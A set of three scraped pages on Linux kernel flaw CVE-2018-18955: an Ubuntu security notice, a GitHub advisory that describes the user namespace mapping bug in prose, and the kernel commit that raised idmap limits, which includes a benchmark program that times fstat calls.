=== Content from usn.ubuntu.com_045b735b_20250124_213127.html ===


Your submission was sent successfully!
*Close*

Thank you for contacting us. A member of our team will be in touch shortly.
*Close*

You have successfully unsubscribed!
*Close*

Thank you for signing up for our newsletter!

In these regular emails you will find the latest updates about
Ubuntu and upcoming events where you can meet our team.*Close*

Your preferences have been successfully updated. *Close*

[Canonical Ubuntu](/)

* [Menu](/navigation)

* [Products](/navigation#products-navigation)
* [Use cases](/navigation#use-case-navigation)
* [Support](/navigation#support-navigation)
* [Community](/navigation#community-navigation)
* [Get Ubuntu](/navigation#get-ubuntu-navigation)

[![](https://assets.ubuntu.com/v1/82818827-CoF_white.svg)

Security](/security)

* [ESM](/security/esm)
* [Livepatch](/security/livepatch)
* [Certifications & Hardening](/security/compliance-automation)
* [CVEs](/security/cves)
* [Notices](/security/notices)
* [Docker Images](/security/docker-images)

# USN-3836-2: Linux kernel (HWE) vulnerabilities

4 December 2018

Several security issues were fixed in the Linux kernel.

### Reduce your security exposure

Ubuntu Pro provides ten-year security coverage to 25,000+ packages in Main and Universe repositories, and it is free for up to five machines.

[Learn more about Ubuntu Pro](/pro)

## Releases

* [Ubuntu 16.04 ESM](/security/notices?release=xenial)

## Packages

* [linux-gcp](/security/cves?package=linux-gcp) - Linux kernel for Google Cloud Platform (GCP) systems
* [linux-hwe](/security/cves?package=linux-hwe) - Linux hardware enablement (HWE) kernel

## Details

USN-3836-1 fixed vulnerabilities in the Linux kernel for Ubuntu 18.04

LTS. This update provides the corresponding updates for the Linux

Hardware Enablement (HWE) kernel from Ubuntu 18.04 LTS for Ubuntu

16.04 LTS.

Jann Horn discovered that the Linux kernel mishandles mapping UID or GID

ranges inside nested user namespaces in some situations. A local attacker

could use this to bypass access controls on resources outside the

namespace. ([CVE-2018-18955](/security/CVE-2018-18955))

Philipp Wendler discovered that the overlayfs implementation in the Linux

kernel did not properly verify the directory contents permissions from

within a unprivileged user namespace. A local attacker could use this to

expose sensitive information (protected file names). ([CVE-2018-6559](/security/CVE-2018-6559))

### Reduce your security exposure

Ubuntu Pro provides ten-year security coverage to 25,000+ packages in Main and Universe repositories, and it is free for up to five machines.

[Learn more about Ubuntu Pro](/pro)

## Update instructions

The problem can be corrected by updating your system to the following package versions:

##### Ubuntu 16.04

* [linux-image-4.15.0-42-generic](https://launchpad.net/ubuntu/%2Bsource/linux-hwe)
  -
  [4.15.0-42.45~16.04.1](https://launchpad.net/ubuntu/%2Bsource/linux-hwe/4.15.0-42.45~16.04.1)
* [linux-image-4.15.0-42-generic-lpae](https://launchpad.net/ubuntu/%2Bsource/linux-hwe)
  -
  [4.15.0-42.45~16.04.1](https://launchpad.net/ubuntu/%2Bsource/linux-hwe/4.15.0-42.45~16.04.1)
* [linux-image-4.15.0-42-lowlatency](https://launchpad.net/ubuntu/%2Bsource/linux-hwe)
  -
  [4.15.0-42.45~16.04.1](https://launchpad.net/ubuntu/%2Bsource/linux-hwe/4.15.0-42.45~16.04.1)

After a standard system update you need to reboot your computer to make

all the necessary changes.

ATTENTION: Due to an unavoidable ABI change the kernel updates have

been given a new version number, which requires you to recompile and

reinstall all third party kernel modules you might have installed.

Unless you manually uninstalled the standard kernel metapackages

(e.g. linux-generic, linux-generic-lts-RELEASE, linux-virtual,

linux-powerpc), a standard system upgrade will automatically perform

this as well.

## References

* [CVE-2018-18955](/security/CVE-2018-18955)
* [CVE-2018-6559](/security/CVE-2018-6559)

## Related notices

* [USN-3835-1](/security/notices/USN-3835-1)
* [USN-3833-1](/security/notices/USN-3833-1)
* [USN-3836-1](/security/notices/USN-3836-1)
* [USN-3832-1](/security/notices/USN-3832-1)

### Join the discussion

* [Ubuntu security updates mailing list](https://lists.ubuntu.com/mailman/listinfo/ubuntu-hardened)
* [Security announcements mailing list](https://lists.ubuntu.com/mailman/listinfo/ubuntu-security-announce)

### Need help with your security needs?

Ubuntu Pro provides up to ten-year security coverage for over 23,000 open-source packages within the Ubuntu Main and Universe repositories.

[Talk to an expert to find out what would work best for you](/contact-us/form?product=pro)

### Further reading

* *Loading...*

---

## [OpenStack](/openstack) [OpenStack](/openstack)

* [What is OpenStack](/openstack/what-is-openstack)
* [Features](/openstack/features)
* [Managed](/openstack/managed)
* [Consulting](/openstack/consulting)
* [Install](/openstack/install)
* [Support](/openstack/support)

---

## [Ceph](/ceph) [Ceph](/ceph)

* [What is Ceph](/ceph/what-is-ceph)
* [Managed](/ceph/managed)
* [Consulting](/ceph/consulting)
* [Docs](/ceph/docs)
* [Install](/ceph/install)

---

## [Kubernetes](/kubernetes) [Kubernetes](/kubernetes)

* [What is Kubernetes](/kubernetes/what-is-kubernetes)
* [Charmed Kubernetes](/kubernetes/charmed-k8s)
* [Managed](/kubernetes/managed)
* [Install](/kubernetes/install)
* [Docs](/kubernetes/docs)
* [Resources](/kubernetes/resources)

---

## [Managed Services](/managed) [Managed Services](/managed)

* [OpenStack](/openstack/managed)
* [Kubernetes](/kubernetes/managed)
* [Ceph](/ceph/managed)
* [Apps](/managed/apps)
* [Observability](/observability/managed)
* [Firefighting](/managed/firefighting-support)

---

## [AI / ML](/ai) [AI / ML](/ai)

* [MLOps](/ai/mlops)
* [Kubeflow](/ai/what-is-kubeflow)
* [MLflow](/ai/mlflow)
* [Consulting](/ai/consulting)
* [Data Science](/ai/data-science)
* [MLOps workshop](/ai/mlops-workshop)

---

## [Robotics](/robotics) [Robotics](/robotics)

* [What is ROS](/robotics/what-is-ros)
* [ROS ESM](/robotics/ros-esm)
* [Community](/robotics/community)
* [Docs](/robotics/docs)

---

## [IoT](/internet-of-things) [IoT](/internet-of-things)

* [App store](/internet-of-things/appstore)
* [Embedded Linux](/embedded)
* [Management](/internet-of-things/management)

---

## [Ubuntu Core](/core) [Ubuntu Core](/core)

* [Features](/core/features)
* [Success stories](/core/stories)
* [Services](/core/services)
* [Docs](/core/docs)

---

## [Ubuntu Desktop](/desktop) [Ubuntu Desktop](/desktop)

* [Organisations](/desktop/organisations)
* [Developers](/desktop/developers)
* [Flavours](/desktop/flavours)
* [WSL](/desktop/wsl)

---

## [Ubuntu Server](/server) [Ubuntu Server](/server)

* [Hyperscale](/server/hyperscale)
* [Docs](/server/docs)

---

## [Cloud](/cloud) [Cloud](/cloud)

* [What is cloud computing](/cloud/cloud-computing)
* [What is private cloud](/cloud/private-cloud)
* [What is hybrid cloud](/cloud/hybrid-cloud)
* [What is multi-cloud](/cloud/multi-cloud)
* [Public cloud](/cloud/public-cloud)

---

## [Security](/security) [Security](/security)

* [ESM](/security/esm)
* [Livepatch](/security/livepatch)
* [Certifications & Hardening](/security/compliance-automation)
* [CVEs](/security/cves)
* [Notices](/security/notices)
* [Docker Images](/security/docker-images)

---

## [Landscape](/landscape) [Landscape](/landscape)

* [Features](/landscape/features)
* [Managed](/landscape/managed)
* [Compare](/landscape/compare)
* [Install](/landscape/docs/quickstart-deployment)
* [Docs](/landscape/docs)
* [Log in to Landscape](https://landscape.canonical.com/)

---

## [Containers](/containers) [Containers](/containers)

* [What are containers](/containers/what-are-containers)
* [Chiseled Ubuntu](/containers/chiseled)
* [Chiseled and .NET](/containers/chiseled/dotnet)

---

## [Downloads](/download) [Downloads](/download)

* [Desktop](/download/desktop)
* [Server](/download/server)
* [Core](/download/core)
* [Cloud](/download/cloud)

---

## [Support](/support) [Support](/support)

* [Your subscriptions](/pro/dashboard)
* [Account users](/pro/users)
* [Pricing](/pricing/pro)
* [Discourse](https://discourse.ubuntu.com/c/project/ubuntu-pro/116/)

---

## [Observability](/observability) [Observability](/observability)

* [What is observability](/observability/what-is-observability)
* [Managed](/observability/managed)

---

## [Pricing](/pricing) [Pricing](/pricing)

* [Consulting](/pricing/consulting)
* [Desktops](/pricing/desktop)
* [Devices](/pricing/devices)

---

## Solutions

* [AI](https://canonical.com/solutions/ai)
* [Data](https://canonical.com/data)
* [Infrastructure](https://canonical.com/solutions/infrastructure)
* [Secure open source](https://canonical.com/solutions/secure-open-source)

---

## Sectors

* [Automotive](/automotive)
* [Industrial](/industrial)
* [Government](/gov)
* [Telco](/telco)
* [Finance](/financial-services)

---

[Contact us](/contact-us)

* [About us](/about)
* [Community](/community)
* [Careers](https://www.canonical.com/careers)
* [Blog](/blog)
* [Resources](/engage)
* [Press centre](/blog/press-centre)

---

© 2025 Canonical Ltd.

Ubuntu and Canonical are registered trademarks of Canonical Ltd.

---

* [Legal information](/legal)
* [Data privacy](/legal/data-privacy)
* Manage your tracker settings
* [Report a bug on this site](https://github.com/canonical/ubuntu.com/issues/new?template=ISSUE_TEMPLATE.yaml)

Back to top

Go to the top of the page



=== Content from github.com_18eb39ff_20250126_033827.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fadvisories%2FGHSA-c6xj-3c77-g5rg)

**CVE-2018-18955**

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  + [Nonprofits](/solutions/industry/nonprofits)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fadvisories%2FGHSA-c6xj-3c77-g5rg)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2Fadvisories%2F%3Cid%3E&source=header)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

1. [GitHub Advisory Database](/advisories)
2. [Unreviewed](/advisories?query=type%3Aunreviewed)
3. [CVE-2018-18955](/advisories/GHSA-c6xj-3c77-g5rg)

## In the Linux kernel 4.15.x through 4.19.x before 4.19.2,...

High severity

Unreviewed

Published
May 13, 2022
to the GitHub Advisory Database
•
Updated Feb 1, 2023

## Package

No package listed—
[Suggest a package](/advisories/GHSA-c6xj-3c77-g5rg/improve)

## Affected versions

Unknown

## Patched versions

Unknown

## Description

In the Linux kernel 4.15.x through 4.19.x before 4.19.2, map\_write() in kernel/user\_namespace.c allows privilege escalation because it mishandles nested user namespaces with more than 5 UID or GID ranges. A user who has CAP\_SYS\_ADMIN in an affected user namespace can bypass access controls on resources outside the namespace, as demonstrated by reading /etc/shadow. This occurs because an ID transformation takes place properly for the namespaced-to-kernel direction but not for the kernel-to-namespaced direction.

### References

* <https://nvd.nist.gov/vuln/detail/CVE-2018-18955>
* [torvalds/linux@d2f007d](https://github.com/torvalds/linux/commit/d2f007dbe7e4c9583eea6eb04d60001e85c6f1bd)
* <https://bugs.chromium.org/p/project-zero/issues/detail?id=1712>
* <https://cdn.kernel.org/pub/linux/kernel/v4.x/ChangeLog-4.18.19>
* <https://cdn.kernel.org/pub/linux/kernel/v4.x/ChangeLog-4.19.2>
* <https://security.netapp.com/advisory/ntap-20190416-0003/>
* <https://support.f5.com/csp/article/K39103040>
* <https://usn.ubuntu.com/3832-1/>
* <https://usn.ubuntu.com/3833-1/>
* <https://usn.ubuntu.com/3835-1/>
* <https://usn.ubuntu.com/3836-1/>
* <https://usn.ubuntu.com/3836-2/>
* <https://www.exploit-db.com/exploits/45886/>
* <https://www.exploit-db.com/exploits/45915/>
* <http://git.kernel.org/cgit/linux/kernel/git/torvalds/linux.git/commit/?id=d2f007dbe7e4c9583eea6eb04d60001e85c6f1bd>
* <http://www.securityfocus.com/bid/105941>

Published by the [National Vulnerability Database](https://nvd.nist.gov/vuln/detail/CVE-2018-18955)
Nov 16, 2018

Published to the GitHub Advisory Database
May 13, 2022

Last updated
Feb 1, 2023

### Severity

High

7.0

# CVSS overall score

 This score calculates overall vulnerability severity from 0 to 10 and is based on the Common Vulnerability Scoring System (CVSS).

 / 10

#### CVSS v3 base metrics

Attack vector
Local

Attack complexity
High

Privileges required
Low

User interaction
None

Scope
Unchanged

Confidentiality
High

Integrity
High

Availability
High

Learn more about base metrics

# CVSS v3 base metrics

Attack vector:
More severe the more the remote (logically and physically) an attacker can be in order to exploit the vulnerability.

Attack complexity:
More severe for the least complex attacks.

Privileges required:
More severe if no privileges are required.

User interaction:
More severe when no user interaction is required.

Scope:
More severe when a scope change occurs, e.g. one vulnerable component impacts resources in components beyond its security scope.

Confidentiality:
More severe when loss of data confidentiality is highest, measuring the level of data access available to an unauthorized user.

Integrity:
More severe when loss of data integrity is the highest, measuring the consequence of data modification possible by an unauthorized user.

Availability:
More severe when the loss of impacted component availability is highest.

CVSS:3.0/AV:L/AC:H/PR:L/UI:N/S:U/C:H/I:H/A:H

### EPSS score

0.125%

# Exploit Prediction Scoring System (EPSS)

This score estimates the probability of this vulnerability being exploited within the next 30 days.
Data provided by [FIRST](https://www.first.org/epss/user-guide).

 (48th percentile)

### Weaknesses

[CWE-863](/advisories?query=cwe%3A863)

### CVE ID

CVE-2018-18955

### GHSA ID

GHSA-c6xj-3c77-g5rg

### Source code

No known source code

Dependabot alerts are not supported on this advisory because it does not have a package from a supported ecosystem with an affected and fixed version.

[Learn more about GitHub language support](https://docs.github.com/get-started/learning-about-github/github-language-support#about-supported-languages)

 Loading

Checking history

See something to contribute?
[Suggest improvements for this vulnerability](/advisories/GHSA-c6xj-3c77-g5rg/improve).

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from github.com_e3830640_20250126_033826.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Ftorvalds%2Flinux%2Fcommit%2F6397fac4915ab3002dc15aae751455da1a852f25)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  + [Nonprofits](/solutions/industry/nonprofits)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Ftorvalds%2Flinux%2Fcommit%2F6397fac4915ab3002dc15aae751455da1a852f25)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fvoltron%2Fcommit_fragments%2Frepo_layout&source=header-repo&source_repo=torvalds%2Flinux)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[torvalds](/torvalds)
/
**[linux](/torvalds/linux)**
Public

* [Notifications](/login?return_to=%2Ftorvalds%2Flinux) You must be signed in to change notification settings
* [Fork
  54.9k](/login?return_to=%2Ftorvalds%2Flinux)
* [Star
   186k](/login?return_to=%2Ftorvalds%2Flinux)

* [Code](/torvalds/linux)
* [Pull requests
  438](/torvalds/linux/pulls)
* [Actions](/torvalds/linux/actions)
* [Projects
  0](/torvalds/linux/projects)
* [Security](/torvalds/linux/security)
* [Insights](/torvalds/linux/pulse)

Additional navigation options

* [Code](/torvalds/linux)
* [Pull requests](/torvalds/linux/pulls)
* [Actions](/torvalds/linux/actions)
* [Projects](/torvalds/linux/projects)
* [Security](/torvalds/linux/security)
* [Insights](/torvalds/linux/pulse)

## Commit

[Permalink](/torvalds/linux/commit/6397fac4915ab3002dc15aae751455da1a852f25)

This commit does not belong to any branch on this repository, and may belong to a fork outside of the repository.

userns: bump idmap limits to 340

[Browse files](/torvalds/linux/tree/6397fac4915ab3002dc15aae751455da1a852f25)
Browse the repository at this point in the history

```
There are quite some use cases where users run into the current limit for
{g,u}id mappings. Consider a user requesting us to map everything but 999, and
1001 for a given range of 1000000000 with a sub{g,u}id layout of:

some-user:100000:1000000000
some-user:999:1
some-user:1000:1
some-user:1001:1
some-user:1002:1

This translates to:

MAPPING-TYPE | CONTAINER |    HOST |     RANGE |
-------------|-----------|---------|-----------|
         uid |       999 |     999 |         1 |
         uid |      1001 |    1001 |         1 |
         uid |         0 | 1000000 |       999 |
         uid |      1000 | 1001000 |         1 |
         uid |      1002 | 1001002 | 999998998 |
------------------------------------------------
         gid |       999 |     999 |         1 |
         gid |      1001 |    1001 |         1 |
         gid |         0 | 1000000 |       999 |
         gid |      1000 | 1001000 |         1 |
         gid |      1002 | 1001002 | 999998998 |

which is already the current limit.

As discussed at LPC simply bumping the number of limits is not going to work
since this would mean that struct uid_gid_map won't fit into a single cache-line
anymore thereby regressing performance for the base-cases. The same problem
seems to arise when using a single pointer. So the idea is to use

struct uid_gid_extent {
	u32 first;
	u32 lower_first;
	u32 count;
};

struct uid_gid_map { /* 64 bytes -- 1 cache line */
	u32 nr_extents;
	union {
		struct uid_gid_extent extent[UID_GID_MAP_MAX_BASE_EXTENTS];
		struct {
			struct uid_gid_extent *forward;
			struct uid_gid_extent *reverse;
		};
	};
};

For the base cases we will only use the struct uid_gid_extent extent member. If
we go over UID_GID_MAP_MAX_BASE_EXTENTS mappings we perform a single 4k
kmalloc() which means we can have a maximum of 340 mappings
(340 * size(struct uid_gid_extent) = 4080). For the latter case we use two
pointers "forward" and "reverse". The forward pointer points to an array sorted
by "first" and the reverse pointer points to an array sorted by "lower_first".
We can then perform binary search on those arrays.

Performance Testing:
When Eric introduced the extent-based struct uid_gid_map approach he measured
the performanc impact of his idmap changes:

> My benchmark consisted of going to single user mode where nothing else was
> running. On an ext4 filesystem opening 1,000,000 files and looping through all
> of the files 1000 times and calling fstat on the individuals files. This was
> to ensure I was benchmarking stat times where the inodes were in the kernels
> cache, but the inode values were not in the processors cache. My results:

> v3.4-rc1:         ~= 156ns (unmodified v3.4-rc1 with user namespace support disabled)
> v3.4-rc1-userns-: ~= 155ns (v3.4-rc1 with my user namespace patches and user namespace support disabled)
> v3.4-rc1-userns+: ~= 164ns (v3.4-rc1 with my user namespace patches and user namespace support enabled)

I used an identical approach on my laptop. Here's a thorough description of what
I did. I built a 4.14.0-rc4 mainline kernel with my new idmap patches applied. I
booted into single user mode and used an ext4 filesystem to open/create
1,000,000 files. Then I looped through all of the files calling fstat() on each
of them 1000 times and calculated the mean fstat() time for a single file. (The
test program can be found below.)

Here are the results. For fun, I compared the first version of my patch which
scaled linearly with the new version of the patch:

|   # MAPPINGS |   PATCH-V1 | PATCH-NEW |
|--------------|------------|-----------|
|   0 mappings |     158 ns |   158 ns  |
|   1 mappings |     164 ns |   157 ns  |
|   2 mappings |     170 ns |   158 ns  |
|   3 mappings |     175 ns |   161 ns  |
|   5 mappings |     187 ns |   165 ns  |
|  10 mappings |     218 ns |   199 ns  |
|  50 mappings |     528 ns |   218 ns  |
| 100 mappings |     980 ns |   229 ns  |
| 200 mappings |    1880 ns |   239 ns  |
| 300 mappings |    2760 ns |   240 ns  |
| 340 mappings | not tested |   248 ns  |

Here's the test program I used. I asked Eric what he did and this is a more
"advanced" implementation of the idea. It's pretty straight-forward:

 #define __GNU_SOURCE
 #define __STDC_FORMAT_MACROS
 #include <errno.h>
 #include <dirent.h>
 #include <fcntl.h>
 #include <inttypes.h>
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
 #include <unistd.h>
 #include <sys/stat.h>
 #include <sys/time.h>
 #include <sys/types.h>

 int main(int argc, char *argv[])
 {
 	int ret;
 	size_t i, k;
 	int fd[1000000];
 	int times[1000];
 	char pathname[4096];
 	struct stat st;
 	struct timeval t1, t2;
 	uint64_t time_in_mcs;
 	uint64_t sum = 0;

 	if (argc != 2) {
 		fprintf(stderr, "Please specify a directory where to create "
 				"the test files\n");
 		exit(EXIT_FAILURE);
 	}

 	for (i = 0; i < sizeof(fd) / sizeof(fd[0]); i++) {
 		sprintf(pathname, "%s/idmap_test_%zu", argv[1], i);
 		fd[i]= open(pathname, O_RDWR | O_CREAT, S_IXUSR | S_IXGRP | S_IXOTH);
 		if (fd[i] < 0) {
 			ssize_t j;
 			for (j = i; j >= 0; j--)
 				close(fd[j]);
 			exit(EXIT_FAILURE);
 		}
 	}

 	for (k = 0; k < 1000; k++) {
 		ret = gettimeofday(&t1, NULL);
 		if (ret < 0)
 			goto close_all;

 		for (i = 0; i < sizeof(fd) / sizeof(fd[0]); i++) {
 			ret = fstat(fd[i], &st);
 			if (ret < 0)
 				goto close_all;
 		}

 		ret = gettimeofday(&t2, NULL);
 		if (ret < 0)
 			goto close_all;

 		time_in_mcs = (1000000 * t2.tv_sec + t2.tv_usec) -
 			      (1000000 * t1.tv_sec + t1.tv_usec);
 		printf("Total time in micro seconds:       %" PRIu64 "\n",
 		       time_in_mcs);
 		printf("Total time in nanoseconds:         %" PRIu64 "\n",
 		       time_in_mcs * 1000);
 		printf("Time per file in nanoseconds:      %" PRIu64 "\n",
 		       (time_in_mcs * 1000) / 1000000);
 		times[k] = (time_in_mcs * 1000) / 1000000;
 	}

 close_all:
 	for (i = 0; i < sizeof(fd) / sizeof(fd[0]); i++)
 		close(fd[i]);

 	if (ret < 0)
 		exit(EXIT_FAILURE);

 	for (k = 0; k < 1000; k++) {
 		sum += times[k];
 	}

 	printf("Mean time per file in nanoseconds: %" PRIu64 "\n", sum / 1000);

 	exit(EXIT_SUCCESS);;
 }

Signed-off-by: Christian Brauner <christian.brauner@ubuntu.com>
CC: Serge Hallyn <serge@hallyn.com>
CC: Eric Biederman <ebiederm@xmission.com>
Signed-off-by: Eric W. Biederman <ebiederm@xmission.com>
```

* Loading branch information

[![@ebiederm](https://avatars.githubusercontent.com/u/7477136?s=40&v=4)](/ebiederm)

Christian Brauner
authored and
[ebiederm](/torvalds/linux/commits?author=ebiederm "View all commits by ebiederm")
committed
Oct 31, 2017

1 parent
[aa4bf44](/torvalds/linux/commit/aa4bf44dc851c6bdd4f7b61b5f2c56c84dfe2ff0)

commit 6397fac

 Show file tree

 Hide file tree

Showing
**2 changed files**
with
**324 additions**
and
**33 deletions**.

* Whitespace
* Ignore whitespace

* Split
* Unified

* include/linux

  + include/linux/user\_namespace.h
    [user\_namespace.h](#diff-d88db53a8759c77df7021badf735e84fba34219d460461189b1e28e0b698509b)
* kernel

  + kernel/user\_namespace.c
    [user\_namespace.c](#diff-5ed7c9c3a2bfc22c99debf409d123ff561727de5cf584817b0724df49aa628bd)

## There are no files selected for viewing

7 changes: 4 additions & 3 deletions

7
[include/linux/user\_namespace.h](#diff-d88db53a8759c77df7021badf735e84fba34219d460461189b1e28e0b698509b "include/linux/user_namespace.h")

Show comments

[View file](/torvalds/linux/blob/6397fac4915ab3002dc15aae751455da1a852f25/include/linux/user_namespace.h)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -10,18 +10,19 @@ |
|  |  | #include <linux/sysctl.h> |
|  |  | #include <linux/err.h> |
|  |  |  |
|  |  | #define UID\_GID\_MAP\_MAX\_EXTENTS 5 |
|  |  | #define UID\_GID\_MAP\_MAX\_BASE\_EXTENTS 5 |
|  |  | #define UID\_GID\_MAP\_MAX\_EXTENTS 340 |
|  |  |  |
|  |  | struct uid\_gid\_extent { |
|  |  | u32 first; |
|  |  | u32 lower\_first; |
|  |  | u32 count; |
|  |  | }; |
|  |  |  |
|  |  | struct uid\_gid\_map { /\* 64 bytes -- 1 cache line \*/ |
|  |  | struct uid\_gid\_map { /\* 64 bytes -- 1 cache line \*/ |
|  |  | u32 nr\_extents; |
|  |  | union { |
|  |  | struct uid\_gid\_extent extent[UID\_GID\_MAP\_MAX\_EXTENTS]; |
|  |  | struct uid\_gid\_extent extent[UID\_GID\_MAP\_MAX\_BASE\_EXTENTS]; |
|  |  | struct { |
|  |  | struct uid\_gid\_extent \*forward; |
|  |  | struct uid\_gid\_extent \*reverse; |
| Expand Down | |  |

 Loading

Oops, something went wrong.
 Retry

Toggle all file notes
Toggle all file annotations

### 0 comments on commit `6397fac`

Please
[sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Ftorvalds%2Flinux%2Fcommit%2F6397fac4915ab3002dc15aae751455da1a852f25) to comment.

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
